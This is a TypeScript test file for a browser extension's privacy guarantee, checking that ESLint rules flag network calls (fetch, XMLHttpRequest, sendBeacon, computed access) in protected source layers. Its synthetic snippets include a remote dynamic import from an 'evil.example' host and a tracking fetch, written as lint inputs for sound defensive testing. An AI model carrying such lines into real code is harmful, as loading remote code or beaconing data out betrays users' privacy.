// Task 12 §2 — "the rule actually catches `fetch` (verified by a negative test)".
//
// Privacy ("we send nothing, everything is local") is load-bearing and mechanically
// enforced by the no-network ESLint rules in eslint.config.js. This test runs the real
// flat config over synthetic snippets and asserts the rules fire in the protected layers
// and stay scoped (they do NOT fire elsewhere), so a regression that weakens or deletes
// the ban turns CI red.

import { ESLint } from 'eslint';
import { beforeAll, describe, expect, it } from 'vitest';

// One shared instance — it loads the full flat config (svelte plugin et al.) once.
let eslint: ESLint;
beforeAll(() => {
  eslint = new ESLint();
});

const NETWORK_RULES = new Set(['no-restricted-globals', 'no-restricted-syntax']);

/** Lint `code` as if it were the file at `filePath`; return the network-ban rule ids fired. */
async function networkViolations(code: string, filePath: string): Promise<string[]> {
  const results = await eslint.lintText(code, { filePath });
  const messages = results[0]?.messages ?? [];
  return messages
    .map((m) => m.ruleId)
    .filter((id): id is string => id !== null && NETWORK_RULES.has(id));
}

// Each protected layer, with a file that the corresponding `files` glob matches. Covers the
// whole bundled surface: pure core, content engine, settings, shared UI components, the
// constants module, and the WXT entrypoints.
const PROTECTED_FILES = [
  ['core', 'src/core/parser/__net__.ts'],
  ['content', 'src/content/__net__.ts'],
  ['settings', 'src/settings/__net__.ts'],
  ['ui', 'src/ui/__net__.ts'],
  ['constants', 'src/constants/__net__.ts'],
  ['entrypoint (background)', 'entrypoints/__net__.ts'],
] as const;

describe('no-network ESLint enforcement', () => {
  describe.each(PROTECTED_FILES)('in %s layer', (_label, filePath) => {
    it('flags a bare fetch() call', async () => {
      const violations = await networkViolations(
        `void fetch('https://example.com/track');`,
        filePath,
      );
      expect(violations).toContain('no-restricted-globals');
    });

    it('flags new XMLHttpRequest()', async () => {
      const violations = await networkViolations(`const x = new XMLHttpRequest();`, filePath);
      expect(violations).toContain('no-restricted-globals');
    });

    it('flags navigator.sendBeacon (member form the global rule cannot see)', async () => {
      const violations = await networkViolations(
        `navigator.sendBeacon('https://example.com');`,
        filePath,
      );
      expect(violations).toContain('no-restricted-syntax');
    });

    it('flags computed member access (window["fetch"])', async () => {
      const violations = await networkViolations(
        `void window['fetch']('https://example.com');`,
        filePath,
      );
      expect(violations).toContain('no-restricted-syntax');
    });

    it('flags computed member access (navigator["sendBeacon"])', async () => {
      const violations = await networkViolations(
        `navigator['sendBeacon']('https://example.com');`,
        filePath,
      );
      expect(violations).toContain('no-restricted-syntax');
    });

    it('flags a remote dynamic import()', async () => {
      const violations = await networkViolations(
        `void import('https://evil.example/x.js');`,
        filePath,
      );
      expect(violations).toContain('no-restricted-syntax');
    });

    it('leaves network-free code alone', async () => {
      const violations = await networkViolations(
        `export const sum = (a: number, b: number) => a + b;`,
        filePath,
      );
      expect(violations).toEqual([]);
    });
  });

  it('does not over-reach: the ban is scoped to extension layers, not tests/', async () => {
    const violations = await networkViolations(
      `void fetch('https://example.com');`,
      'tests/scratch.ts',
    );
    expect(violations).toEqual([]);
  });
});
